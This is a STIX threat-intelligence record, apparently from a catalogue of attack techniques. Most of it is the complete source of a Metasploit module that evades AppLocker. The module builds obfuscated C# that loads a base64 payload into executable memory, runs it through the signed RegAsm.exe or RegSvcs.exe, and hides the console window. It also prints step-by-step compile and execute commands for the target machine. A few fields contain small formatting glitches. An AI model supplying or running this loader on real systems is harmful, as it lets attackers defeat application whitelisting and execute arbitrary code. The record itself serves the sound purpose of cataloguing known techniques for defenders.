{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9c67fec8-c60e-4d37-bd20-c76eb6589426",
    "created": "2024-08-14T16:33:19.190317Z",
    "modified": "2024-08-14T16:33:19.19032Z",
    "name": "Applocker Evasion - Microsoft .NET Assembly Registration Utility",
    "description": "( This module will assist you in evading Microsoft Windows Applocker and Software Restriction Policies. This technique utilises the Microsoft signed binaries RegAsm.exe or RegSvcs.exe to execute user supplied code. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/evasion/windows/applocker_evasion_regasm_regsvcs.rb",
            "external_id": "applocker_evasion_regasm_regsvcs.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "https://attack.mitre.org/techniques/T1121/)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Evasion\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Applocker Evasion - Microsoft .NET Assembly Registration Utility',\n      'Description' => %(\n         This module will assist you in evading Microsoft\n         Windows Applocker and Software Restriction Policies.\n         This technique utilises the Microsoft signed binaries\n         RegAsm.exe or RegSvcs.exe to execute user supplied code.\n                        ),\n      'Author'      =>\n      [\n        'Nick Tyrer <@NickTyrer>', # module development\n        'Casey Smith' # regasm_regsvcs bypass research\n      ],\n      'License'     => 'MSF_LICENSE',\n      'Platform'    => 'win',\n      'Arch'        => [ARCH_X86, ARCH_X64],\n      'Targets'     => [['Microsoft Windows', {}]],\n      'References'  => [['URL', 'https://attack.mitre.org/techniques/T1121/']])\n    )\n\n    register_options(\n      [\n        OptString.new('TXT_FILE', [true, 'Filename for the evasive file (default: regasm_regsvcs.txt)', 'regasm_regsvcs.txt']),\n        OptString.new('SNK_FILE', [true, 'Filename for the .snk file (default: key.snk)', 'key.snk'])\n      ]\n    )\n\n    deregister_options('FILENAME')\n  end\n\n  def build_payload\n    Rex::Text.encode_base64(payload.encoded)\n  end\n\n  def obfu\n    Rex::Text.rand_text_alpha 8\n  end\n\n  def regasm_regsvcs\n    esc = build_payload\n    mod = [obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu]\n    <<~HEREDOC\n      using System;\n      using System.EnterpriseServices;\n      using System.Runtime.InteropServices;\n      namespace #{mod[0]}\n      {\n      public class #{mod[1]} : ServicedComponent\n      {\n      [ComRegisterFunction]\n      public static void RegisterClass(string #{mod[2]})\n      {\n      #{mod[3]}.#{mod[14]}();\n      }\n      [ComUnregisterFunction]\n      public static void UnRegisterClass(string #{mod[2]})\n      {\n      #{mod[3]}.#{mod[14]}();\n      }\n      }\n      public class #{mod[3]}\n      {\n      private static Int32 #{mod[4]}=0x1000;\n      private static IntPtr #{mod[5]}=(IntPtr)0x40;\n      private static UInt32 #{mod[6]} = 0xFFFFFFFF;\n      [System.Runtime.InteropServices.DllImport(\"kernel32\")]\n      private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);\n      [System.Runtime.InteropServices.DllImport(\"kernel32\")]\n      private static extern IntPtr CreateThread(IntPtr att, UIntPtr st, IntPtr sa, IntPtr p, Int32 c, ref IntPtr id);\n      [System.Runtime.InteropServices.DllImport(\"kernel32\")]\n      private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);\n      [System.Runtime.InteropServices.DllImport(\"user32.dll\")]\n      static extern bool ShowWindow(IntPtr #{mod[7]}, int nCmdShow);\n      [System.Runtime.InteropServices.DllImport(\"Kernel32\")]\n      private static extern IntPtr GetConsoleWindow();\n      const int #{mod[8]} = 0;\n      public static void #{mod[14]}()\n      {\n      IntPtr #{mod[7]};\n      #{mod[7]} = GetConsoleWindow();\n      ShowWindow(#{mod[7]}, #{mod[8]});\n      string #{mod[9]} = \"#{esc}\";\n      byte[] #{mod[10]} = Convert.FromBase64String(#{mod[9]});\n      byte[] #{mod[11]} = #{mod[10]};\n      IntPtr #{mod[12]} = VirtualAlloc(IntPtr.Zero, (UIntPtr)#{mod[11]}.Length, #{mod[4]}, #{mod[5]});\n      System.Runtime.InteropServices.Marshal.Copy(#{mod[11]}, 0, #{mod[12]}, #{mod[11]}.Length);\n      IntPtr #{mod[13]} = IntPtr.Zero;\n      WaitForSingleObject(CreateThread(#{mod[13]}, UIntPtr.Zero, #{mod[12]}, #{mod[13]}, 0, ref #{mod[13]}), #{mod[6]});\n      }\n      }\n      }\n    HEREDOC\n  end\n\n  def snk\n    debaser = 'BwIAAAAkAABSU0EyAAQAAAEAAQD9yIxqf9oJgwLw6nUHqVNq4LaP+/eaL4qTT9K9aV/z7ddCP8+Uf2/47KnHklpaw+eH03ZaA2yKYBA9s+Al0VoyajA76HQp\n    HDaCgiURBIT2GBLUGwdhoEMWX5J8eoCzkucJEjSsavQh+r9JeB6zcQvoZIx0PrpELgQc8is8j2jvsFuc5LQ8ZFoPk1273TTxKibw84HFESjxJrRtkSjwoEo4OUuZtL3C7fD\n    gnaSoeLnMwohmyTTjt15zgBZv7xD5u/CHD4/+tySJufY5j0FkBxhyqt2DWHcmH4MQCC6PgYfIuTXEAD35o0cg+6s6pJYKB+DUCrU5vSime3jyWno9vCe87UT+fQcDrKntHB\n    mjnj9WliAMZlU1IuCWieT7fzGZqqIsd4rrcgxetnWzaWRAkgHcTVkmVPIt0z9zHU71s7CER2viklJkiaZjRQan5ZA7bTqqsuG1xoIyXTWbKsaAMCKf5a4IJS2ImpqaYA9HR\n    BrIV7be2o0QJxSm1LPqBXJqkAhnCpcYyfve2dql7fF+fAIDGe3ZgCEbJsfYuAaAY0snGJQhUgLmwO8GDbsbMUTuBQspDv8QXsF53UNH5v5dnOKaTfo71LrI+I5zBUqEYP3B\n    DtK0qryu/J1eq80nPAmpNqRbFnYm1OdGKpgzHS+Ws7obPSt1HG3//BxC3a5znX0evfCfSaaWRswhjvblnh1070b3jkT6nJeksKuuVEHvudAQAtGn2vxNDs4CqrJODi5Z/BA\n    KgpIZqQeZmh3r4Zb5OI0='\n    Rex::Text.decode_base64(debaser)\n  end\n\n  def file_format_filename(name = '')\n    name.empty? ? @fname : @fname = name\n  end\n\n  def create_files\n    f1 = datastore['TXT_FILE'].empty? ? 'regasm_regsvcs.txt' : datastore['TXT_FILE']\n    f1 << '.txt' unless f1.downcase.end_with?('.txt')\n    f2 = datastore['SNK_FILE'].empty? ? 'key.snk' : datastore['SNK_FILE']\n    f2 << '.snk' unless f2.downcase.end_with?('.snk')\n    txt_file = regasm_regsvcs\n    snk_file = snk\n    file_format_filename(f1)\n    file_create(txt_file)\n    file_format_filename(f2)\n    file_create(snk_file)\n  end\n\n  def instructions\n    print_status \"Copy #{datastore['TXT_FILE']} and #{datastore['SNK_FILE']} to the target\"\n    if payload.arch.first == ARCH_X86\n      print_status \"Compile using: C:\\\\Windows\\\\Microsoft.Net\\\\Framework\\\\[.NET Version]\\\\csc.exe /r:System.EnterpriseServices.dll /target:library /out:#{datastore['TXT_FILE'].gsub('.txt', '.dll')} /keyfile:#{datastore['SNK_FILE']} #{datastore['TXT_FILE']}\"\n      print_status \"Execute using: C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\[.NET Version]\\\\regsvcs.exe #{datastore['TXT_FILE'].gsub('.txt', '.dll')}\"\n      print_status 'or'\n      print_status \"Execute using: C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\[.NET Version]\\\\regasm.exe /U #{datastore['TXT_FILE'].gsub('.txt', '.dll')}\"\n    else\n      print_status \"Compile using: C:\\\\Windows\\\\Microsoft.Net\\\\Framework64\\\\[.NET Version]\\\\csc.exe /r:System.EnterpriseServices.dll /target:library /out:#{datastore['TXT_FILE'].gsub('.txt', '.dll')} /keyfile:#{datastore['SNK_FILE']} #{datastore['TXT_FILE']}\"\n      print_status \"Execute using: C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\[.NET Version]\\\\regsvcs.exe #{datastore['TXT_FILE'].gsub('.txt', '.dll')}\"\n      print_status 'or'\n      print_status \"Execute using: C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\[.NET Version]\\\\regasm.exe /U #{datastore['TXT_FILE'].gsub('.txt', '.dll')}\"\n    end\n  end\n\n  def run\n    create_files\n    instructions\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}